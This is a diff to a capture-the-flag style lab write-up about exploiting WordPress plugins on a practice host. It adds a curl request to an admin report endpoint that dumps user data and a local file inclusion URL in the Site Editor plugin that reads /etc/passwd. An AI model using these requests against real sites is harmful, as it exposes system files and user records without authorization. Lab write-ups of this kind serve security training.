@@ -558,11 +558,21 @@ so now with a proof of concept from https://cxsecurity.com/issue/WLB-2020080034/
 
 ![](Images/Pasted%20image%2020240313201821.png)
 
-
+then with `curl 'http://blog.inlanefreight.local/wp-admin/admin.php?page=download_report&report=users&status=all'` I can see the flag results
 
 ### What is the version number of the plugin vulnerable to an LFI?
 
 this is also viewable from the previous wpscan results: 
 
 ![](Images/Pasted%20image%2020240313201425.png)
+
+### Use the LFI to identify a system user whose name starts with the letter "f"
+
+for this vulnerability there is a POC on https://www.exploit-db.com/exploits/44340: 
+
+![](Images/Pasted%20image%2020240313202226.png)
+
+then with `view-source:http://blog.inlanefreight.local/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd` I can see the user: 
+
+![](Images/Pasted%20image%2020240313202354.png)
 
